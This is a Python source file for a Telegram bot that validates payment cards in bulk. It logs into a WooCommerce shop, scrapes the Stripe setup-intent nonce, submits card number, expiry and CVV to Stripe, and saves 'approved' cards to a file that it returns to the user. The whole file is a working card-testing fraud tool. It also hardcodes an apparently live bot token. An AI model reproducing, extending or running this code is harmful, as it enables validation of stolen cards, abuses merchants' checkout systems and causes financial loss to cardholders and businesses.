import logging
import requests
import re
import time
import threading
from bs4 import BeautifulSoup
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from io import BytesIO

BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"  # <-- REPLACE THIS WITH YOUR BOT TOKEN

logging.basicConfig(level=logging.INFO)
user_sites = {}
lock = threading.Lock()

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': 'https://google.com',
    'Connection': 'keep-alive'
}

def sanitize_site(site):
    return site.replace("https://", "").replace("http://", "").split("/")[0]

def detect_stripe_type(soup):
    if "setup_intent" in soup.text:
        return "setup_intent"
    elif "payment_method" in soup.text:
        return "payment_method"
    elif "source" in soup.text:
        return "source"
    elif "token" in soup.text:
        return "token"
    return "unknown"

def try_login(email, password, site, session):
    login_url = f"https://{site}/my-account/"
    r = session.get(login_url, headers=HEADERS)
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
    referer = soup.find("input", {"name": "_wp_http_referer"})

    if not nonce:
        return False, "Login page error."

    payload = {
        'username': email,
        'password': password,
        'woocommerce-login-nonce': nonce["value"],
        '_wp_http_referer': referer["value"] if referer else "/my-account/",
        'login': 'Log in'
    }

    r = session.post(login_url, data=payload, headers=HEADERS)
    return ("customer-logout" in r.text), r

async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args

    if not args or len(args) < 1 or '|' not in args[0]:
        await update.message.reply_text("Usage: /addsitelogin site|email|password")
        return

    try:
        site, email, password = args[0].split("|")
        site = sanitize_site(site)
        session = requests.Session()

        success, resp = try_login(email, password, site, session)
        if not success:
            await update.message.reply_text(f"Login failed: {resp}")
            return

        stripe_type = detect_stripe_type(BeautifulSoup(resp.text, 'html.parser'))
        if stripe_type == "unknown":
            await update.message.reply_text("Could not detect Stripe setup method.")
            return

        with lock:
            user_sites[user_id] = {
                "site": site,
                "email": email,
                "password": password,
                "stripe_type": stripe_type
            }

        await update.message.reply_text(
            f"𝐒𝐢𝐭𝐞 𝐥𝐨𝐠𝐢𝐧 𝐜𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 𝐟𝐨𝐫 {site} 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐚𝐯𝐞𝐝 ✅\n"
            f"𝐒𝐭𝐫𝐢𝐩𝐞 𝐌𝐞𝐭𝐡𝐨𝐝 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝: `{stripe_type}`"
        )
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

def parse_card(card):
    patterns = [
        r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})'
    ]
    for pattern in patterns:
        match = re.match(pattern, card)
        if match:
            return match.groups()
    return None

def process_card(card, user_data):
    try:
        parsed = parse_card(card)
        if not parsed:
            return f"{card} -> Invalid format ❌"
        card_number, exp_month, exp_year, cvv = parsed
        site = user_data["site"]
        email = user_data["email"]
        password = user_data["password"]
        stripe_type = user_data["stripe_type"]

        login_url = f"https://{site}/my-account/"
        check_url = f"https://{site}/my-account/add-payment-method/"
        ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"

        session = requests.Session()
        success, _ = try_login(email, password, site, session)
        if not success:
            return f"{card} -> Login failed ❌"

        resp = session.get(check_url, headers=HEADERS)
        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(\w+)"', resp.text)
        if not ajax_nonce:
            return f"{card} -> Could not extract ajax nonce ❌"

        pm_resp = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={'Authorization': 'Bearer pk_live_xxx'},
            data={
                'type': 'card',
                'card[number]': card_number,
                'card[exp_month]': exp_month,
                'card[exp_year]': exp_year,
                'card[cvc]': cvv,
                'billing_details[address][postal_code]': '10001'
            }
        )

        pm_json = pm_resp.json()
        if 'error' in pm_json:
            return f"{card} -> Declined ❌ - {pm_json['error']['message']}"

        payment_method = pm_json['id']
        payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce.group(1)
        }

        final_resp = session.post(ajax_url, data=payload, headers={'X-Requested-With': 'XMLHttpRequest'})
        result = final_resp.json()

        if result.get("success") and result.get("data", {}).get("status") == "succeeded":
            with open("approved.txt", "a") as f:
                f.write(card + "\n")
            return f"{card} -> Approved ✅"
        else:
            reason = result.get("data", {}).get("message", "Declined")
            return f"{card} -> Declined ❌ - {reason}"
    except Exception as e:
        return f"{card} -> Error: {e}"

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sites:
        await update.message.reply_text("Please add a site first with /addsitelogin")
        return

    if not context.args:
        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
        return

    card = context.args[0]
    result = process_card(card, user_sites[user_id])
    await update.message.reply_text(result)

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in user_sites:
        await update.message.reply_text("Please add a site first with /addsitelogin")
        return

    file = await update.message.document.get_file()
    content = await file.download_as_bytes()
    lines = content.decode().splitlines()

    stats = {"total": 0, "approved": 0, "declined": 0, "errors": 0}
    msg = await update.message.reply_text("Starting check...")

    for card in lines:
        stats["total"] += 1
        result = process_card(card, user_sites[user_id])
        if "Approved" in result:
            stats["approved"] += 1
        elif "Declined" in result:
            stats["declined"] += 1
        else:
            stats["errors"] += 1

        await msg.edit_text(
            f"𝐓𝐨𝐭𝐚𝐥: {stats['total']} | ✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['errors']}"
        )

    await update.message.reply_document(document=BytesIO(open("approved.txt", "rb").read()), filename="approved.txt")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), mchk))
    app.run_polling()

if __name__ == "__main__":
    main()
